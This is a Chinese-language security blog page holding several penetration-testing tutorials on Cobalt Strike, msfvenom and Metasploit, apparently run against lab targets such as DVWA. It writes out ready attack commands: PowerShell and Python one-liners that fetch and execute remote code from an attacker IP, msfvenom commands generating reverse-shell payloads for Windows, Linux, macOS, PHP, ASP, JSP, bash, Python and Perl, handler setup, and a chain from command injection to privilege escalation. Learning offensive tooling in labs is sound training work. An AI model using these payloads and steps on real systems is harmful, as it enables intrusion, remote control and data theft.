<p>输入 shell whoami 默认时间间隔是60s（防止被IDS查杀）  可以通过命令或者操做设置sleep时间</p>
<p><img src="/2023/06/09/Cobaltstrike/image-20230529174836112.png" alt="image-20230529174836112"></p>
<p>输入help查看有哪些命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; help</span><br><span class="line"></span><br><span class="line">Beacon Commands</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">    Command                   Description</span><br><span class="line">    -------                   -----------</span><br><span class="line">    argue                     Spoof arguments for matching processes</span><br><span class="line">    blockdlls                 Block non-Microsoft DLLs in child processes</span><br><span class="line">    browserpivot              Setup a browser pivot session</span><br><span class="line">    cancel                    Cancel a download that&#x27;s in-progress</span><br><span class="line">    cd                        Change directory</span><br><span class="line">    checkin                   Call home and post data</span><br><span class="line">    chromedump                Recover credentials from Google Chrome</span><br><span class="line">    clear                     Clear beacon queue</span><br><span class="line">    connect                   Connect to a Beacon peer over TCP</span><br><span class="line">    covertvpn                 Deploy Covert VPN client</span><br><span class="line">    cp                        Copy a file</span><br><span class="line">    dcsync                    Extract a password hash from a DC</span><br><span class="line">    desktop                   View and interact with target&#x27;s desktop</span><br><span class="line">    dllinject                 Inject a Reflective DLL into a process</span><br><span class="line">    dllload                   Load DLL into a process with LoadLibrary()</span><br><span class="line">    download                  Download a file</span><br><span class="line">    downloads                 Lists file downloads in progress</span><br><span class="line">    drives                    List drives on target</span><br><span class="line">    elevate                   Spawn a session in an elevated context</span><br><span class="line">    execute                   Execute a program on target (no output)</span><br><span class="line">    execute-assembly          Execute a local .NET program in-memory on target</span><br><span class="line">    exit                      Terminate the beacon session</span><br><span class="line">    getprivs                  Enable system privileges on current token</span><br><span class="line">    getsystem                 Attempt to get SYSTEM</span><br><span class="line">    getuid                    Get User ID</span><br><span class="line">    hashdump                  Dump password hashes</span><br><span class="line">    help                      Help menu</span><br><span class="line">    inject                    Spawn a session in a specific process</span><br><span class="line">    inline-execute            Run a Beacon Object File in this session</span><br><span class="line">    jobkill                   Kill a long-running post-exploitation task</span><br><span class="line">    jobs                      List long-running post-exploitation tasks</span><br><span class="line">    jump                      Spawn a session on a remote host</span><br><span class="line">    kerberos_ccache_use       Apply kerberos ticket from cache to this session</span><br><span class="line">    kerberos_ticket_purge     Purge kerberos tickets from this session</span><br><span class="line">    kerberos_ticket_use       Apply kerberos ticket to this session</span><br><span class="line">    keylogger                 Start a keystroke logger</span><br><span class="line">    kill                      Kill a process</span><br><span class="line">    link                      Connect to a Beacon peer over a named pipe</span><br><span class="line">    logonpasswords            Dump credentials and hashes with mimikatz</span><br><span class="line">    ls                        List files</span><br><span class="line">    make_token                Create a token to pass credentials</span><br><span class="line">    mimikatz                  Runs a mimikatz command</span><br><span class="line">    mkdir                     Make a directory</span><br><span class="line">    mode dns                  Use DNS A as data channel (DNS beacon only)</span><br><span class="line">    mode dns-txt              Use DNS TXT as data channel (DNS beacon only)</span><br><span class="line">    mode dns6                 Use DNS AAAA as data channel (DNS beacon only)</span><br><span class="line">    mv                        Move a file</span><br><span class="line">    net                       Network and host enumeration tool</span><br><span class="line">    note                      Assign a note to this Beacon       </span><br><span class="line">    portscan                  Scan a network for open services</span><br><span class="line">    powerpick                 Execute a command via Unmanaged PowerShell</span><br><span class="line">    powershell                Execute a command via powershell.exe</span><br><span class="line">    powershell-import         Import a powershell script</span><br><span class="line">    ppid                      Set parent PID for spawned post-ex jobs</span><br><span class="line">    printscreen               Take a single screenshot via PrintScr method</span><br><span class="line">    ps                        Show process list</span><br><span class="line">    psinject                  Execute PowerShell command in specific process</span><br><span class="line">    pth                       Pass-the-hash using Mimikatz</span><br><span class="line">    pwd                       Print current directory</span><br><span class="line">    reg                       Query the registry</span><br><span class="line">    remote-exec               Run a command on a remote host</span><br><span class="line">    rev2self                  Revert to original token</span><br><span class="line">    rm                        Remove a file or folder</span><br><span class="line">    rportfwd                  Setup a reverse port forward</span><br><span class="line">    rportfwd_local            Setup a reverse port forward via Cobalt Strike client</span><br><span class="line">    run                       Execute a program on target (returns output)</span><br><span class="line">    runas                     Execute a program as another user</span><br><span class="line">    runasadmin                Execute a program in an elevated context</span><br><span class="line">    runu                      Execute a program under another PID</span><br><span class="line">    screenshot                Take a single screenshot</span><br><span class="line">    screenwatch               Take periodic screenshots of desktop</span><br><span class="line">    setenv                    Set an environment variable</span><br><span class="line">    shell                     Execute a command via cmd.exe</span><br><span class="line">    shinject                  Inject shellcode into a process</span><br><span class="line">    shspawn                   Spawn process and inject shellcode into it</span><br><span class="line">    sleep                     Set beacon sleep time</span><br><span class="line">    socks                     Start SOCKS4a server to relay traffic</span><br><span class="line">    socks stop                Stop SOCKS4a server</span><br><span class="line">    spawn                     Spawn a session </span><br><span class="line">    spawnas                   Spawn a session as another user</span><br><span class="line">    spawnto                   Set executable to spawn processes into</span><br><span class="line">    spawnu                    Spawn a session under another process</span><br><span class="line">    spunnel                   Spawn and tunnel an agent via rportfwd</span><br><span class="line">    spunnel_local             Spawn and tunnel an agent via Cobalt Strike client rportfwd</span><br><span class="line">    ssh                       Use SSH to spawn an SSH session on a host</span><br><span class="line">    ssh-key                   Use SSH to spawn an SSH session on a host</span><br><span class="line">    steal_token               Steal access token from a process</span><br><span class="line">    timestomp                 Apply timestamps from one file to another</span><br><span class="line">    unlink                    Disconnect from parent Beacon</span><br><span class="line">    upload                    Upload a file</span><br></pre></td></tr></table></figure>



<h2 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h2><h3 id="1-设置监听器"><a href="#1-设置监听器" class="headerlink" title="1.设置监听器"></a>1.设置监听器</h3><p>设置监听器和上述步骤一样</p>
<p><img src="/2023/06/09/Cobaltstrike/image-20230608103956044.png" alt="image-20230608103956044"></p>
<h3 id="2-设置Attack"><a href="#2-设置Attack" class="headerlink" title="2.设置Attack"></a>2.设置Attack</h3><p>以Scripted Web Delivery为例</p>
<p><img src="/2023/06/09/Cobaltstrike/image-20230608104237412.png" alt="image-20230608104237412"></p>
<p><img src="/2023/06/09/Cobaltstrike/image-20230608104440319.png" alt="image-20230608104440319"></p>
<p>生成powershell木马</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://ip:9091/a&#x27;))&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.197.128:9091/a&#x27;))&quot;</span><br></pre></td></tr></table></figure>



<h3 id="3-寻找靶机漏洞，执行命令"><a href="#3-寻找靶机漏洞，执行命令" class="headerlink" title="3.寻找靶机漏洞，执行命令"></a>3.寻找靶机漏洞，执行命令</h3><p>这里以DVWA的命令执行漏洞为例</p>
<p><img src="/2023/06/09/Cobaltstrike/image-20230608104912451.png" alt="image-20230608104912451"></p>
<p>把后面的命令换成我们上一步生成的attack 木马</p>
<p><img src="/2023/06/09/Cobaltstrike/image-20230608105327095.png" alt="image-20230608105327095"></p>
<h3 id="4-靶机上线"><a href="#4-靶机上线" class="headerlink" title="4.靶机上线"></a>4.靶机上线</h3><p>然后靶机成功上线</p>
<p><img src="/2023/06/09/Cobaltstrike/image-20230608105409789.png" alt="image-20230608105409789"></p>
<p><img src="/2023/06/09/Cobaltstrike/image-20230608105747263.png" alt="image-20230608105747263"></p>
<h3 id="5-提权"><a href="#5-提权" class="headerlink" title="5.提权"></a>5.提权</h3><p>提权就需要我们根据靶机的系统版本等，找到对应的提权脚本进行攻击提权</p>
<p><img src="/2023/06/09/Cobaltstrike/image-20230608110131075.png" alt="image-20230608110131075"></p>
<p><img src="/2023/06/09/Cobaltstrike/image-20230608110151571.png" alt="image-20230608110151571"></p>
<p>选择对应的脚本，进行提权</p>
<h3 id="6-内网信息收集"><a href="#6-内网信息收集" class="headerlink" title="6.内网信息收集"></a>6.内网信息收集</h3><p>然后进行相应的操做</p>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Cobaltstrike/" rel="tag">Cobaltstrike</a></li></ul>

    </footer>
  </div>

   
   
  
</article>

    
    <article
  id="post-msfvenom"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2023/06/09/msfvenom/"
    >msfvenom</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2023/06/09/msfvenom/" class="article-date">
  <time datetime="2023-06-09T09:18:58.000Z" itemprop="datePublished">2023-06-09</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h1><p>msfvenom是msfpayload和msfencode的组合。将这两个攻击集成在一个框架示例中。它是用来生成后门的软件，在目标机器上执行后门，在本地监听上线</p>
<h2 id="msfvenom基本参数"><a href="#msfvenom基本参数" class="headerlink" title="msfvenom基本参数"></a>msfvenom基本参数</h2><p><img src="/2023/06/09/msfvenom/image-20230531171728448.png" alt="image-20230531171728448"></p>
<h2 id="msfvenom生成payload"><a href="#msfvenom生成payload" class="headerlink" title="msfvenom生成payload"></a>msfvenom生成payload</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/qq_34839026/article/details/128722499?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=msfvenom%E7%94%9F%E6%88%90payload&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-2-128722499.142^v88^control_2,239^v2^insert_chatgpt&amp;spm=1018.2226.3001.4187</span><br></pre></td></tr></table></figure>

<h3 id="可执行程序payload"><a href="#可执行程序payload" class="headerlink" title="可执行程序payload"></a>可执行程序payload</h3><h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=ip LPORT=port -a x86 --platform Linux -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=ip LPORT=port -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure>



<h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><p>32位</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=ip LPORT=port -a x86 --platform Windows -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=ip LPORT=port -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure>

<p>64位</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ip LPORT=port -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure>

<h4 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a>Mac</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=ip LPORT=4444 -a x86 --platform osx -f macho &gt; shell.macho</span><br></pre></td></tr></table></figure>

<h4 id="攻击Windows64位实例"><a href="#攻击Windows64位实例" class="headerlink" title="攻击Windows64位实例"></a>攻击Windows64位实例</h4><p>生成可执行文件木马</p>
<p><img src="/2023/06/09/msfvenom/image-20230608123941742.png" alt="image-20230608123941742"></p>
<p>开启监听</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">set lhost ip</span><br><span class="line">set lport port</span><br><span class="line">run/exploit</span><br><span class="line">exploit -j 放在后台运行</span><br><span class="line">jobs   查看</span><br></pre></td></tr></table></figure>

<p><img src="/2023/06/09/msfvenom/image-20230608125721588.png" alt="image-20230608125721588"></p>
<p>把刚刚生成的木马文件放到靶机里执行</p>
<p><img src="/2023/06/09/msfvenom/image-20230608130758716.png" alt="image-20230608130758716"></p>
<p><img src="/2023/06/09/msfvenom/image-20230608130936738.png" alt="image-20230608130936738"></p>
<p>这样就拿到了meterpreter</p>
<h3 id="web-payload"><a href="#web-payload" class="headerlink" title="web payload"></a>web payload</h3><h4 id="php"><a href="#php" class="headerlink" title="php"></a>php</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=ip LPORT=4444 -f raw &gt; shell.php</span><br><span class="line">cat shell.php | pbcopy &amp;&amp; echo &#x27;&lt;?php &#x27; | tr -d &#x27;\n&#x27; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</span><br></pre></td></tr></table></figure>

<h4 id="asp"><a href="#asp" class="headerlink" title="asp"></a>asp</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=ip LPORT=4444 -f asp &gt; shell.asp</span><br></pre></td></tr></table></figure>

<h4 id="jsp"><a href="#jsp" class="headerlink" title="jsp"></a>jsp</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=ip LPORT=4444 -f raw &gt; shell.jsp</span><br></pre></td></tr></table></figure>

<h4 id="war"><a href="#war" class="headerlink" title="war"></a>war</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=ip LPORT=4444 -f war &gt; shell.wars</span><br></pre></td></tr></table></figure>

<h4 id="攻击实例"><a href="#攻击实例" class="headerlink" title="攻击实例"></a>攻击实例</h4><p>生成php木马文件</p>
<p><img src="/2023/06/09/msfvenom/image-20230608132435178.png" alt="image-20230608132435178"></p>
<p>设置监听</p>
<p><img src="/2023/06/09/msfvenom/image-20230608132515877.png" alt="image-20230608132515877"></p>
<p>在靶机里面执行刚刚生成的木马文件</p>
<p><img src="/2023/06/09/msfvenom/image-20230608132627564.png" alt="image-20230608132627564"></p>
<p>然后就拿到了meterpreter</p>
<p><img src="/2023/06/09/msfvenom/image-20230608132825317.png" alt="image-20230608132825317"></p>
<h3 id="脚本payload"><a href="#脚本payload" class="headerlink" title="脚本payload"></a>脚本payload</h3><h4 id="python"><a href="#python" class="headerlink" title="python"></a>python</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=ip LPORT=4444 -f raw &gt; shell.py</span><br><span class="line">msfvenom -a python -p python/meterpreter/reverse_tcp LHOST=ip LPORT=4444 -f raw &gt; shell.py</span><br></pre></td></tr></table></figure>

<h4 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_bash LHOST=ip LPORT=4444 -f raw &gt; shell.sh</span><br></pre></td></tr></table></figure>

<h4 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_perl LHOST=ip LPORT=4444 -f raw &gt; shell.pl</span><br></pre></td></tr></table></figure>

<h3 id="staged-amp-stageless-payload"><a href="#staged-amp-stageless-payload" class="headerlink" title="staged&amp;stageless payload"></a>staged&amp;stageless payload</h3><table>
<thead>
<tr>
<th>payload</th>
<th>staged</th>
<th>stsgeless</th>
</tr>
</thead>
<tbody><tr>
<td>reverse_tcp</td>
<td>windows&#x2F;meterpreter&#x2F;reverse_tcp</td>
<td>windows&#x2F;meterpreter_reverse_tcp</td>
</tr>
<tr>
<td>reverse_https</td>
<td>windows&#x2F;meterpreter&#x2F;reverse_https</td>
<td>windows&#x2F;meterpreter_reverse_https</td>
</tr>
<tr>
<td>bind_tcp</td>
<td>windows&#x2F;meterpreter&#x2F;bind_tcp</td>
<td>windows&#x2F;meterpreter_bind_tcp</td>
</tr>
<tr>
<td>reverse_tcp ipv6</td>
<td>windows&#x2F;meterpreter&#x2F;reverse_ipv6_tcp</td>
<td>windows&#x2F;meterpreter_reverse_ipv6_tcp</td>
</tr>
</tbody></table>
<h4 id="stageless"><a href="#stageless" class="headerlink" title="stageless"></a>stageless</h4><p>Stageless meterpreter是一个二进制文件，包含meterpreter的所有必需部分以及所有必需的扩展，全部捆绑在一起，将完整的payload都编译在木马文件中体积较大</p>
<h4 id="staged"><a href="#staged" class="headerlink" title="staged"></a>staged</h4><p>staged meterpreter负责建立目标用户与攻击者之间的连接，将执行传递到另一个阶段，如reverse_tcp,bind_tcp</p>
<p>stageless和staged就像web入侵里面提到的大马和小马一样，一个功能齐全，一个只是构造一个连接或命令执行，还需要通过其他的工具进行管理</p>
<h2 id="攻击Windows实例"><a href="#攻击Windows实例" class="headerlink" title="攻击Windows实例"></a>攻击Windows实例</h2><p>靶机：windows</p>
<p>攻击机：kali</p>
<h4 id="web-delivery"><a href="#web-delivery" class="headerlink" title="web_delivery"></a>web_delivery</h4><p>当攻击者用户受害者主机的部分控制权，但还没有拿到一个完整的shell时，web_delivery就派上用场了。</p>
<p>web_delivery的主要目的是快速和受害者主机建立一条session，当受害者主机存在比如命令注入、远程代码执行等问题时，攻击者可以使用web_delivery生成一条命令进行连接。</p>
<p>另外web_delivery不会在受害者的主机磁盘上写文件，而是直接将攻击者的服务器上的代码加载到内存执行，有利于绕过检测。</p>
<p>web_delivery支持php&#x2F;python&#x2F;powershell等多种脚本，使用不同的脚本的payload时需要通过set target 0、1、2来进行设置是什么类型的脚本。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/script/web_delivery</span><br><span class="line">set payload ……</span><br><span class="line">set lhost</span><br><span class="line">set lport</span><br><span class="line">set targets 序号</span><br><span class="line">run</span><br></pre></td></tr></table></figure>



<h4 id="方法一：通过web站点，使用无文件的方式攻击利用"><a href="#方法一：通过web站点，使用无文件的方式攻击利用" class="headerlink" title="方法一：通过web站点，使用无文件的方式攻击利用"></a>方法一：通过web站点，使用无文件的方式攻击利用</h4><p>当我们已经确定了要攻击的靶机，那么下一步就应该去扫描端口，看哪些端口是开放着的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">namp -sV -T4 靶机IP</span><br></pre></td></tr></table></figure>

<p>然后根据开放的端口进行攻击</p>
<p>这里靶机漏洞以dvwa靶场的命令执行为例</p>
<p>首先利用web_delivery生成木马</p>
<p><img src="/2023/06/09/msfvenom/image-20230609170441456.png" alt="image-20230609170441456"></p>
<p>然后把生成的木马放到靶机的漏洞里执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import sys;import ssl;u=__import__(&#x27;urllib&#x27;+&#123;2:&#x27;&#x27;,3:&#x27;.request&#x27;&#125;[sys.version_info[0]],fromlist=(&#x27;urlopen&#x27;,));r=u.urlopen(&#x27;http://192.168.197.128:8080/eWDQyMGivssnLlv&#x27;,context=ssl._create_unverified_context());exec(r.read());&quot;</span><br></pre></td></tr></table></figure>



<h4 id="方法二：通过web站点，上传webshell，返回给msf"><a href="#方法二：通过web站点，上传webshell，返回给msf" class="headerlink" title="方法二：通过web站点，上传webshell，返回给msf"></a>方法二：通过web站点，上传webshell，返回给msf</h4> 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/msfvenom/" rel="tag">msfvenom</a></li></ul>

    </footer>
  </div>

   
   
  
</article>

    
    <article
  id="post-metasploit框架"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2023/06/09/metasploit%E6%A1%86%E6%9E%B6/"
    >metasploit框架</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2023/06/09/metasploit%E6%A1%86%E6%9E%B6/" class="article-date">
  <time datetime="2023-06-09T09:16:34.000Z" itemprop="datePublished">2023-06-09</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <p>简称MSF，高度模块儿化，框架由多个module组成。</p>
<p>它是一款开源安全漏洞利用和测试工具，集成了各种平台上常见的溢出漏洞和流行的shellcode，并持续保持更新。</p>
<h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/metasploit-framework</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">data:包含metasploit用于存储某些漏洞、单词列表、图像等所需二进制文件的可编辑文件</span><br><span class="line">documentation:包含框架可用的框架</span><br><span class="line">lib：metasploit的库文件夹</span><br><span class="line">plugins:用来存放metasploit的插件</span><br><span class="line">scripts:用来存放metasploit的脚本，包括meterpreter及其脚本</span><br><span class="line">tools:存放多种命令行实用程序</span><br><span class="line">modules:存储metasploit的模块文件</span><br></pre></td></tr></table></figure>

<p>modules目录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">auxiliary：辅助模块，辅助渗透（端口扫描、登录密码爆破、漏洞验证）</span><br><span class="line">encoders ：编码器模块，主要包含各种编码工具，对payload进行编码加密，以便绕过入侵检测和过滤系统</span><br><span class="line">evasion ：躲避模块，用来生成免杀的payload</span><br><span class="line">exploits：漏洞模块，包含主流的漏洞利用脚本，通常是对某些可能存在漏洞的目标进行漏洞利用。命名规则：操作系统/各种应用协议分类</span><br><span class="line">nops：由于IDS/IPS会检查数据包中国不规则的数据，在某些情况下，比如针对溢出攻击，某些特殊滑行字符串会因为被拦截而导致攻击失效</span><br><span class="line">payloads：攻击载荷，主要是攻击成功后在目标及其执行的代码，比如反弹shell的代码</span><br><span class="line">post：后渗透阶段模块，漏洞利用成功获得meterpreter之后，向目标发送的一些功能性指令，如：提权等</span><br></pre></td></tr></table></figure>

<h2 id="metasploit简单命令"><a href="#metasploit简单命令" class="headerlink" title="metasploit简单命令"></a>metasploit简单命令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfdb init:初始化数据库</span><br><span class="line">msfconsole:启动</span><br><span class="line">db_status:查看是否连接到数据库</span><br><span class="line">workspace:查看工作区</span><br><span class="line">workspace -h:查看帮助命令</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="metasploit-信息收集"><a href="#metasploit-信息收集" class="headerlink" title="metasploit-信息收集"></a>metasploit-信息收集</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">db_nmap:nmap扫描</span><br><span class="line">-PA：TCP ACK PING扫描</span><br><span class="line">-PS: TCP SYN PING扫描</span><br><span class="line">-PR: ARP扫描是nmap对目标进行一个arp ping扫描的过程，尤其是在内网的情况下。因为防火墙不会禁止ARP请求</span><br><span class="line">hosts:当前工作区的所有主机</span><br><span class="line"></span><br><span class="line">-T[0-5]：默认是T3,T4表示最大TCP扫描延迟位10ms</span><br><span class="line">-sS:TCP SYN扫描</span><br><span class="line">-sA:TCP ACK扫描</span><br><span class="line">-sT：TCP扫描</span><br><span class="line">-A ：打开操作系统探测和版本探测</span><br></pre></td></tr></table></figure>

<h2 id="利用模块进行扫描"><a href="#利用模块进行扫描" class="headerlink" title="利用模块进行扫描"></a>利用模块进行扫描</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">端口扫描</span><br><span class="line">use auxiliary/scanner/portscan/模式</span><br><span class="line">use auxiliary/scanner/portscan/syn 半开扫描</span><br><span class="line">以use auxiliary/scanner/portscan/syn 扫描为例</span><br><span class="line">可以通过使用</span><br><span class="line">search portscan 进行查看都有什么方式</span><br><span class="line">show options    查看都有什么选项</span><br><span class="line">set rhost ip地址</span><br><span class="line">set threads 设置线程</span><br><span class="line">使用run或者exploit进行跑</span><br></pre></td></tr></table></figure>



